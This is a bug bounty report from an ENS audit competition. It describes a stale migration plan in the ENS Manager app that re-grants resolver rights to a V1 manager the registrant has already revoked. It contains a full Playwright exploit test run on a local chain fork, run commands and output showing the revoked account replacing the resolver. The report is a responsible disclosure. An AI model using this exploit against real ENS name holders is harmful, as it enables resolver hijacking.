# 89285 w a medium fresh v1 owner updates do not invalidate a migration plan re authorizing a revoked manager

**Submitted on Aug 18th 2026 at 12:07:30 UTC by @hyuunn for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89285
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as:
    * a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker
    * redirecting the recipient of a name transfer
    * leaving a name permanently inaccessible after the flow

## Description

## Brief/Intro

The ENS Manager can build a V1-to-V2 migration plan from a V1 manager address that was valid when the dashboard loaded and retain that address after a fresh owner update. If the registrant reclaims the name from that manager and continues to migration in the same SPA session, the latest V1 query cache correctly shows the registrant as owner, but the transaction plan still grants the removed manager V2 `ROLE_SET_RESOLVER`. The normal owner-approved migration therefore re-authorizes a revoked address, which can replace the migrated name's resolver and hijack or disrupt resolution.

## Vulnerability Details

For an unwrapped `.eth` name, the V1 response contains separate BaseRegistrar registrant and ENS Registry owner values:

```graphql
owner {
  id
}
registrant {
  id
}
```

`classifyName` uses `registrant.id` to determine whether the connected wallet may migrate the registration, but independently converts a different `owner.id` into `managerAddress`:

```typescript
const registryOwnerAddress = toAddress(domain.owner.id)
const managerAddress =
  registryOwnerAddress &&
  registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()
    ? registryOwnerAddress
    : null
```

That address is authority-bearing. `buildRoleGrantCall` encodes it as the recipient of V2 `ROLE_SET_RESOLVER`:

```typescript
args: [resource, ROLE_SET_RESOLVER, name.managerAddress]
```

The state-management bug occurs when the V1 owner changes without changing the name's domain ID. `useMigrationGasEstimate` derives its revision only from the selected domain IDs and uses the following query key:

```typescript
const domainIds = domains
  .map((domain) => domain.id)
  .sort()
  .join(',')

if (selectionRevisionRef.current.domainIds !== domainIds) {
  selectionRevisionRef.current = {
    domainIds,
    revision: selectionRevisionRef.current.revision + 1,
  }
}

queryKey: [
  'migration-gas-estimate',
  ownerAddress?.toLowerCase() ?? '',
  hcaAddress?.toLowerCase() ?? '',
  domainIds,
  selectionRevisionRef.current.revision,
]
```

`managerAddress` and the other authority-relevant V1 values are absent from the key. Consequently, this sequence can occur:

{% stepper %}
{% step %}

## The victim is the BaseRegistrar registrant

The victim is the BaseRegistrar registrant of an unwrapped V1 `.eth` name, while the attacker is its legitimate separate V1 Registry manager.
{% endstep %}

{% step %}

## The dashboard loads

The victim loads the Manager dashboard. The V1 data truthfully contains `registrant=victim, owner=attacker`.
{% endstep %}

{% step %}

## The victim reclaims the name

The victim calls the standard BaseRegistrar `reclaim` function. Current `ENSRegistry.owner(namehash(name))` becomes the victim and the attacker loses V1 manager authority.
{% endstep %}

{% step %}

## Migration continues in the same SPA session

The victim continues to the migration page in the same SPA session. The page can synchronously build its gas/migration plan from the already available pre-reclaim data while the V1 names query refreshes.
{% endstep %}

{% step %}

## The V1 cache refreshes but the plan remains stale

The refresh completes and the application's latest V1 query cache now contains `owner=victim`. Because the domain ID is unchanged, the existing name-bearing gas-plan query remains keyed to the same revision and still contains `managerAddress=attacker`.
{% endstep %}

{% step %}

## The victim submits the normal upgrade

The victim clicks the normal upgrade button. `MigrationPage` passes `gasEstimate.plan` to the migration actor, which captures it unchanged.
{% endstep %}

{% step %}

## Pre-submit checks do not validate current V1 manager authority

The pre-submit checks validate planned approval state, not the current V1 Registry manager. The retry ownership check reads the BaseRegistrar token owner, not `ENSRegistry.owner(namehash(name))`.
{% endstep %}

{% step %}

## The migration re-grants the revoked manager

The atomic migration appends and verifies a V2 `ROLE_SET_RESOLVER` grant to the removed attacker.
{% endstep %}
{% endstepper %}

The wallet-confirmation UI describes this only as “Restore the existing managers”; it does not identify the grantee address. No delayed external update, compromised data source, response tampering, leaked key, privileged project account, or phishing is required. The attacker only needs to have been the legitimate V1 manager when the dashboard was loaded. The conditional victim sequence is to reclaim that manager and continue the normal migration flow without reloading the app.

The end-to-end PoC makes the state divergence explicit immediately before the wallet approval:

```
CACHE_LATEST_V1_OWNER=0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266
CACHE_PLANNED_MANAGER=0x70997970c51812dc3a010c7d01b50e0d17dc79c8
```

The first address is the victim and the second is the already-revoked attacker. The PoC then proves on-chain that the attacker receives `ROLE_SET_RESOLVER` and can successfully call `setResolver`.

## Impact Details

The Manager migration assigns resolver-management authority to an address that the registrant has already revoked on V1. That address can replace the migrated name's resolver without the registrant's authorization. The PoC sets the resolver to an address that does not implement a resolver, demonstrating resolver takeover and resolution disruption until an authorized party repairs the name.

The affected set is conditional: the victim must own an unwrapped V1 `.eth` name with a separate manager, load the dashboard while that manager is valid, reclaim the name, and continue migration in the same SPA session. The attacker cannot force those victim actions. Nevertheless, the resulting authority is created by the Manager migration itself and matches the competition's explicit Critical impact for a migration that assigns a name's resolver to an attacker or hijacks or bricks an ENS name during the flow.

The PoC does not claim a completed theft, direct payment-address redirection, or permanent bricking. It directly demonstrates unauthorized resolver takeover and temporary resolution failure.

**Selected impact:** Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as:

* a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker
* redirecting the recipient of a name transfer
* leaving a name permanently inaccessible after the flow

## References

* [The shared V1 names query is keyed by wallet address](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/hooks/useV1Names.ts#L12-L29)
* [The gas-plan revision and query key omit managerAddress and track only domain IDs](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/hooks/useMigrationGasEstimate.ts#L62-L104)
* [The unwrapped-name classifier converts owner.id into managerAddress](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/migration/src/service/classifyNames.ts#L148-L167)
* [MigrationPage submits the cached gasEstimate.plan](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/pages/MigrationPage.tsx#L265-L282)
* [The migration actor captures that plan unchanged](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/state/migrationUi.machine.ts#L145-L163)
* [managerAddress is encoded as the recipient of ROLE\_SET\_RESOLVER](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildRoleGrantCalls.ts#L8-L26)
* [The atomic batch executes and verifies the manager role grant](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L608-L624)
* [The pre-submit check validates approval state, not the V1 Registry manager](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/migrationService.ts#L1161-L1193)
* [The retry check validates BaseRegistrar ownership, not current Registry manager authority](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/migrationService.ts#L705-L736)
* [The confirmation text does not identify the restored manager](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx#L81-L89)

## Proof of Concept

The following Playwright test uses the real Manager UI, connected headless wallet, smart-account and transaction-manager path, pinned Sepolia fork, and deployed V1 and V2 contracts. The intercepted V1 API response is not stale or attacker-controlled: for every request, the route reads the current local-chain `ENSRegistry.owner(namehash(name))` and returns that value. Responses are counted only after `route.fulfill` completes.

The test proves all of the following:

{% stepper %}
{% step %}

## Pre-reclaim source response

The pre-reclaim source response truthfully reports the attacker.
{% endstep %}

{% step %}

## On-chain reclaim

Reclaim changes the current on-chain V1 Registry owner to the victim.
{% endstep %}

{% step %}

## Post-reclaim refetch

Post-reclaim app refetches truthfully report the victim before any attacker role exists.
{% endstep %}

{% step %}

## Cache and plan divergence

Immediately before signing, the app's current V1 cache contains the victim while its name-bearing migration plan contains the attacker.
{% endstep %}

{% step %}

## Migration role grant

The normal Manager migration succeeds and grants the attacker V2 `ROLE_SET_RESOLVER`.
{% endstep %}

{% step %}

## Attacker resolver update

A transaction signed by the attacker successfully replaces the resolver.
{% endstep %}

{% step %}

## Final on-chain verification

The final resolver value is verified on-chain.
{% endstep %}
{% endstepper %}

### PoC files

* `stale-manager.spec.ts` — full E2E exploit test
* `playwright.poc.config.ts` — isolated Playwright project configuration

Save them as `e2e/poc/stale-manager.spec.ts` and `e2e/playwright.poc.config.ts` respectively.

The full test source is:

```typescript
import { labelToCanonicalId } from '@ensdomains/ensjs/utils/v2'
import type { Page } from '@playwright/test'
import {
  type Address,
  encodeFunctionData,
  keccak256,
  namehash,
  parseAbi,
  toHex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'

import {
  authorizeTransactionsWhile,
  expect,
  test,
} from '../fixtures/playwright.manager.fixture.js'
import {
  publicClient,
  testClient,
  walletClient,
} from '../helpers/anvil-client.js'

const V1_SUBGRAPH = '**/v1-graphql.ens.dev/subgraph'
const V1_SUBGRAPH_URL = 'https://v1-graphql.ens.dev/subgraph'
const V1_BASE_REGISTRAR =
  '0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85' as Address
const V1_ENS_REGISTRY = '0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e' as Address
const V2_ETH_REGISTRY = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2' as Address
const ROLE_SET_RESOLVER = 1n << 24n
const MALICIOUS_RESOLVER =
  '0x000000000000000000000000000000000000badd' as Address

const v1RegistryAbi = parseAbi([
  'function owner(bytes32 node) view returns (address)',
  'function setOwner(bytes32 node, address owner)',
])
const baseRegistrarAbi = parseAbi([
  'function reclaim(uint256 id, address owner)',
  'function ownerOf(uint256 id) view returns (address)',
  'function transferFrom(address from, address to, uint256 id)',
  'function nameExpires(uint256 id) view returns (uint256)',
])
const v2RegistryAbi = parseAbi([
  'function hasRoles(uint256 anyId, uint256 roleBitmap, address account) view returns (bool)',
  'function setResolver(uint256 anyId, address resolver)',
  'function getResolver(string label) view returns (address)',
])

async function serveCurrentV1Manager(
  page: Page,
  name: string,
  registrant: Address,
  attacker: Address,
  resource: bigint,
) {
  const label = name.replace(/\.eth$/, '')
  const node = namehash(name)
  const servedResponses: Array<{
    owner: Address
    probe: boolean
    requestedAddress: string | undefined
    attackerHasRole: boolean
  }> = []
  await page.route(V1_SUBGRAPH, async (route, request) => {
    const body = request.postData() ?? ''
    if (!body.includes('getNamesForAddress')) return route.continue()
    const payload = JSON.parse(body) as {
      variables?: {
        whereFilter?: { and?: Array<{ or?: Array<{ owner?: string }> }> }
      }
    }
    const requestedAddress =
      payload.variables?.whereFilter?.and?.[0]?.or?.[0]?.owner

    const currentManager = await publicClient.readContract({
      address: V1_ENS_REGISTRY,
      abi: v1RegistryAbi,
      functionName: 'owner',
      args: [node],
    })
    const attackerHasRole = await publicClient.readContract({
      address: V2_ETH_REGISTRY,
      abi: v2RegistryAbi,
      functionName: 'hasRoles',
      args: [resource, ROLE_SET_RESOLVER, attacker],
    })
    const probe = request.headers()['x-poc-freshness-probe'] === '1'
    const servedResponse = {
      owner: currentManager,
      probe,
      requestedAddress,
      attackerHasRole,
    }
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({
        data: {
          domains: [
            {
              id: namehash(name),
              labelName: label,
              labelhash: keccak256(toHex(label)),
              name,
              resolver: null,
              owner: { id: currentManager.toLowerCase() },
              registrant: { id: registrant.toLowerCase() },
              wrappedOwner: null,
              parent: { name: 'eth', wrappedDomain: null },
              registration: {
                expiryDate: String(Math.floor(Date.now() / 1000) + 31_536_000),
              },
              wrappedDomain: null,
            },
          ],
        },
      }),
    })
    servedResponses.push(servedResponse)
    console.log(
      `V1_SOURCE_FULFILLED owner=${currentManager} probe=${probe} attackerRole=${attackerHasRole} address=${requestedAddress}`,
    )
  })
  return servedResponses
}

test('re-authorizes a reclaimed V1 manager who can replace the V2 resolver', async ({
  migrationConnectedPage: page,
  wallet,
  accounts,
}) => {
  const victim = privateKeyToAccount(accounts.getPrivateKey('user'))
  const attacker = privateKeyToAccount(accounts.getPrivateKey('user2'))
  const name = 'wallet.eth'
  const label = name.replace(/\.eth$/, '')
  const node = namehash(name)
  const tokenId = BigInt(keccak256(toHex(label)))
  const resource = labelToCanonicalId(label)

  // Move a real, unwrapped V1 registration from the pinned Sepolia fork to
  // the victim. The corresponding V2 slot is already RESERVED by the snapshot.
  const previousRegistrant = await publicClient.readContract({
    address: V1_BASE_REGISTRAR,
    abi: baseRegistrarAbi,
    functionName: 'ownerOf',
    args: [tokenId],
  })
  await testClient.setBalance({
    address: previousRegistrant,
    value: 10n ** 18n,
  })
  await testClient.impersonateAccount({ address: previousRegistrant })
  const transferTx = await walletClient.sendTransaction({
    account: previousRegistrant,
    to: V1_BASE_REGISTRAR,
    data: encodeFunctionData({
      abi: baseRegistrarAbi,
      functionName: 'transferFrom',
      args: [previousRegistrant, victim.address, tokenId],
    }),
  })
  expect(
    (await publicClient.waitForTransactionReceipt({ hash: transferTx })).status,
  ).toBe('success')
  await testClient.stopImpersonatingAccount({ address: previousRegistrant })

  const establishVictimTx = await walletClient.sendTransaction({
    account: victim,
    to: V1_BASE_REGISTRAR,
    data: encodeFunctionData({
      abi: baseRegistrarAbi,
      functionName: 'reclaim',
      args: [tokenId, victim.address],
    }),
  })
  expect(
    (await publicClient.waitForTransactionReceipt({ hash: establishVictimTx }))
      .status,
  ).toBe('success')

  const delegateTx = await walletClient.sendTransaction({
    account: victim,
    to: V1_ENS_REGISTRY,
    data: encodeFunctionData({
      abi: v1RegistryAbi,
      functionName: 'setOwner',
      args: [node, attacker.address],
    }),
  })
  await publicClient.waitForTransactionReceipt({ hash: delegateTx })
  expect(
    await publicClient.readContract({
      address: V1_ENS_REGISTRY,
      abi: v1RegistryAbi,
      functionName: 'owner',
      args: [node],
    }),
  ).toBe(attacker.address)

  // Load the dashboard while the attacker really is the current V1 manager.
  // The route above always reads the live Registry, so every response reflects
  // current chain state. The app initially builds from this truthful snapshot.
  const servedResponses = await serveCurrentV1Manager(
    page,
    name,
    victim.address,
    attacker.address,
    resource,
  )
  await page.evaluate(async () => {
    const router = (
      window as Window & {
        __TSR_ROUTER__: {
          navigate(options: { to: string }): Promise<void>
        }
      }
    ).__TSR_ROUTER__
    await router.navigate({ to: '/dashboard' })
  })
  await page.waitForURL('**/dashboard')
  const upgradeButton = page
    .getByRole('button', { name: 'Upgrade Names' })
    .first()
  await upgradeButton.waitFor({ state: 'visible', timeout: 60_000 })
  await expect
    .poll(() => servedResponses.filter(({ probe }) => !probe).length)
    .toBeGreaterThan(0)
  const preReclaimAppRequests = servedResponses.filter(({ probe }) => !probe)
  expect(
    preReclaimAppRequests.every(({ owner }) => owner === attacker.address),
  ).toBe(true)

  // Revoke the attacker on-chain after the Manager has read the old state.
  const reclaimTx = await walletClient.sendTransaction({
    account: victim,
    to: V1_BASE_REGISTRAR,
    data: encodeFunctionData({
      abi: baseRegistrarAbi,
      functionName: 'reclaim',
      args: [tokenId, victim.address],
    }),
  })
  await publicClient.waitForTransactionReceipt({ hash: reclaimTx })
  expect(
    await publicClient.readContract({
      address: V1_ENS_REGISTRY,
      abi: v1RegistryAbi,
      functionName: 'owner',
      args: [node],
    }),
  ).toBe(victim.address)
  expect(
    await publicClient.readContract({
      address: V2_ETH_REGISTRY,
      abi: v2RegistryAbi,
      functionName: 'hasRoles',
      args: [resource, ROLE_SET_RESOLVER, attacker.address],
    }),
  ).toBe(false)

  // Prove the data source now returns the victim as the current manager. This
  // direct fetch does not mutate TanStack Query's cached application result.
  const freshOwner = await page.evaluate(async (url) => {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-PoC-Freshness-Probe': '1',
      },
      body: JSON.stringify({
        operationName: 'getNamesForAddress',
        query: 'query getNamesForAddress { domains { owner { id } } }',
      }),
    })
    const json = (await response.json()) as {
      data: { domains: Array<{ owner: { id: string } }> }
    }
    return json.data.domains[0]?.owner.id
  }, V1_SUBGRAPH_URL)
  expect(freshOwner?.toLowerCase()).toBe(victim.address.toLowerCase())

  // Navigate without a reload. The migration first builds its gas plan from
  // the already available snapshot while a fresh V1 names request runs.
  await upgradeButton.click()
  const confirm = page.getByRole('button', { name: /Upgrade \d+ name/ })
  await confirm.waitFor({ state: 'visible', timeout: 10_000 })
  await expect
    .poll(
      () =>
        servedResponses.filter(
          ({ probe, owner, attackerHasRole }) =>
            !probe &&
            !attackerHasRole &&
            owner.toLowerCase() === victim.address.toLowerCase(),
        ).length,
    )
    .toBeGreaterThan(0)

  const readMigrationCache = () =>
    page.evaluate(
      ({ name, victimAddress, attackerAddress }) => {
        type CachedQuery = {
          queryKey: readonly unknown[]
          state: { data?: unknown }
        }
        const router = (
          window as Window & {
            __TSR_ROUTER__: {
              options: {
                context: {
                  queryClient: {
                    getQueryCache(): { getAll(): CachedQuery[] }
                  }
                }
              }
            }
          }
        ).__TSR_ROUTER__
        const queries = router.options.context.queryClient
          .getQueryCache()
          .getAll()
        const v1NamesQuery = queries.find(({ queryKey }) => {
          const key = queryKey[0] as
            | { $scope?: string; $action?: string }
            | undefined
          return key?.$scope === 'migration' && key.$action === 'v1_names'
        })
        const v1Names = v1NamesQuery?.state.data as
          | Array<{ name: string; owner: { id: string } }>
          | undefined
        type CachedGasPlan = {
          plan?: {
            classified?: Array<{
              domain: { name: string }
              managerAddress: string | null
            }>
          }
        }
        const gasPlan = queries
          .filter(({ queryKey }) => queryKey[0] === 'migration-gas-estimate')
          .map(({ state }) => state.data as CachedGasPlan | undefined)
          .find((data) =>
            data?.plan?.classified?.some(({ domain }) => domain.name === name),
          )
        return {
          latestOwner:
            v1Names
              ?.find((domain) => domain.name === name)
              ?.owner.id.toLowerCase() ?? null,
          plannedManager:
            gasPlan?.plan?.classified
              ?.find(({ domain }) => domain.name === name)
              ?.managerAddress?.toLowerCase() ?? null,
          expectedLatestOwner: victimAddress.toLowerCase(),
          expectedPlannedManager: attackerAddress.toLowerCase(),
        }
      },
      {
        name,
        victimAddress: victim.address,
        attackerAddress: attacker.address,
      },
    )

  // The decisive TOCTOU assertion: immediately before signing, the app's
  // current V1 query says victim, while its transaction plan still grants the
  // removed attacker. Authority changes do not participate in the plan key.
  await expect.poll(readMigrationCache).toEqual({
    latestOwner: victim.address.toLowerCase(),
    plannedManager: attacker.address.toLowerCase(),
    expectedLatestOwner: victim.address.toLowerCase(),
    expectedPlannedManager: attacker.address.toLowerCase(),
  })
  const cacheBeforeSigning = await readMigrationCache()
  const appSourceRequestsBeforePlan = servedResponses.filter(
    ({ probe }) => !probe,
  ).length
  expect(appSourceRequestsBeforePlan).toBeGreaterThanOrEqual(
    preReclaimAppRequests.length,
  )

  let complete = false
  const authorize = authorizeTransactionsWhile(page, wallet, () => complete)
  await confirm.click()
  await page
    .getByRole('dialog', { name: 'Your name has been upgraded!' })
    .waitFor({ timeout: 180_000 })
  complete = true
  await authorize

  expect(
    await publicClient.readContract({
      address: V2_ETH_REGISTRY,
      abi: v2RegistryAbi,
      functionName: 'hasRoles',
      args: [resource, ROLE_SET_RESOLVER, attacker.address],
    }),
  ).toBe(true)

  const hijackTx = await walletClient.sendTransaction({
    account: attacker,
    to: V2_ETH_REGISTRY,
    data: encodeFunctionData({
      abi: v2RegistryAbi,
      functionName: 'setResolver',
      args: [resource, MALICIOUS_RESOLVER],
    }),
  })
  const hijackReceipt = await publicClient.waitForTransactionReceipt({
    hash: hijackTx,
  })
  expect(hijackReceipt.status).toBe('success')
  const resolver = await publicClient.readContract({
    address: V2_ETH_REGISTRY,
    abi: v2RegistryAbi,
    functionName: 'getResolver',
    args: [label],
  })
  expect(resolver.toLowerCase()).toBe(MALICIOUS_RESOLVER.toLowerCase())

  const freshPreGrantResponses = servedResponses
    .slice(preReclaimAppRequests.length)
    .filter(({ probe, attackerHasRole }) => !probe && !attackerHasRole)
  expect(freshPreGrantResponses.length).toBeGreaterThan(0)
  expect(
    freshPreGrantResponses.every(
      ({ owner }) => owner.toLowerCase() === victim.address.toLowerCase(),
    ),
  ).toBe(true)

  console.log(`POC_NAME=${name}`)
  console.log(`PRE_RECLAIM_SOURCE_OWNER=${servedResponses[0]?.owner}`)
  console.log(
    `POST_RECLAIM_SOURCE_OWNER=${servedResponses[preReclaimAppRequests.length]?.owner}`,
  )
  console.log(`PRE_RECLAIM_APP_SOURCE_REQUESTS=${preReclaimAppRequests.length}`)
  console.log(`APP_SOURCE_REQUESTS_BEFORE_PLAN=${appSourceRequestsBeforePlan}`)
  console.log(`CACHE_LATEST_V1_OWNER=${cacheBeforeSigning.latestOwner}`)
  console.log(`CACHE_PLANNED_MANAGER=${cacheBeforeSigning.plannedManager}`)
  console.log(
    `FRESH_PRE_GRANT_SOURCE_RESPONSES=${freshPreGrantResponses.length}`,
  )
  console.log(`CURRENT_V1_OWNER=${victim.address}`)
  console.log(`REVIVED_V2_MANAGER=${attacker.address}`)
  console.log(`ATTACKER_SET_RESOLVER=${MALICIOUS_RESOLVER}`)
})
```

The configuration file is:

```typescript
import { defineConfig } from '@playwright/test'
import { baseConfig } from './playwright.config.base.js'

export default defineConfig({
  ...baseConfig,
  testDir: './poc',
  timeout: 300_000,
  use: {
    ...baseConfig.use,
    baseURL: process.env.MANAGER_APP_URL ?? 'http://127.0.0.1:3001',
  },
  projects: [{ name: 'stale-manager-poc', testMatch: /stale-manager\.spec\.ts$/ }],
})
```

### Run instructions

{% stepper %}
{% step %}

## Check out the audited revision and install dependencies

```bash
git checkout 1c9b47f18fcddd2e864dfe385c4171061c9811ae
corepack enable
pnpm install --frozen-lockfile
```

{% endstep %}

{% step %}

## Start the local fork stack, fund the fixture accounts, and start Manager

```bash
docker compose -f e2e/infra/docker-compose.yml up -d
bash e2e/infra/scripts/fund-account.sh 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
bash e2e/infra/scripts/fund-rhinestone-account.sh
corepack pnpm --filter manager exec vite dev --mode ci --host 127.0.0.1
```

Vite may choose port 3001 if port 3000 is occupied. Use the URL printed by Vite below.
{% endstep %}

{% step %}

## Run the PoC

```bash
MANAGER_APP_URL=http://127.0.0.1:3001 \
E2E_MOCK_INDEXER=true \
ANVIL_RPC_URL=http://127.0.0.1:8545 \
corepack pnpm --filter @ens-apps/e2e exec playwright test \
  --config=playwright.poc.config.ts
```

{% endstep %}
{% endstepper %}

### Observed output

```
V1_SOURCE_FULFILLED owner=0x70997970C51812dc3A010C7d01b50e0d17dc79C8 probe=false attackerRole=false address=0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266
V1_SOURCE_FULFILLED owner=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 probe=true attackerRole=false address=undefined
V1_SOURCE_FULFILLED owner=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 probe=false attackerRole=false address=0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266
V1_SOURCE_FULFILLED owner=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 probe=false attackerRole=false address=0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266
V1_SOURCE_FULFILLED owner=0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750 probe=false attackerRole=true address=0xf39fd6e51aad88f6f4ce6aB8827279cfffb92266
POC_NAME=wallet.eth
PRE_RECLAIM_SOURCE_OWNER=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
POST_RECLAIM_SOURCE_OWNER=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
PRE_RECLAIM_APP_SOURCE_REQUESTS=1
APP_SOURCE_REQUESTS_BEFORE_PLAN=2
CACHE_LATEST_V1_OWNER=0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266
CACHE_PLANNED_MANAGER=0x70997970c51812dc3a010c7d01b50e0d17dc79c8
FRESH_PRE_GRANT_SOURCE_RESPONSES=2
CURRENT_V1_OWNER=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
REVIVED_V2_MANAGER=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
ATTACKER_SET_RESOLVER=0x000000000000000000000000000000000000badd
  ✓  1 [stale-manager-poc] › poc/stale-manager.spec.ts:128:1 › re-authorizes a reclaimed V1 manager who can replace the V2 resolver (26.8s)

  1 passed (29.7s)
```
